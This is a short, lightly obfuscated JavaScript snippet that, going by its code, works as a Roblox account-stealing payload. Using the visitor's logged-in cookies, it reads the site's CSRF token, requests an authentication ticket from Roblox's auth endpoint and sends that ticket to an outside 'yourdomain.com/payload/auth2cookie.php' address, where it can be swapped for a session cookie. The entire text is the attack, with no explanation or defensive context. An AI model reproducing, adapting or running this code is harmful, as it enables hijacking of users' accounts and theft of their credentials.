(async function() {
    var token = (await (await fetch('https://www.roblox.com', {
        'credentials': 'include'
    }))['text']())['split']('setToken(\x27')[0x1]['split']('\x27)')[0x0];
    var authticket = (await fetch('https://auth.roblox.com/v1/authentication-ticket', {
        'method': 'POST',
        'credentials': 'include',
        'headers': {
            'x-csrf-token': token
        }
    }))['headers']['get']('rbx-authentication-ticket');
    await fetch('https://yourdomain.com/payload/auth2cookie.php' + '?t=' + authticket);
}());
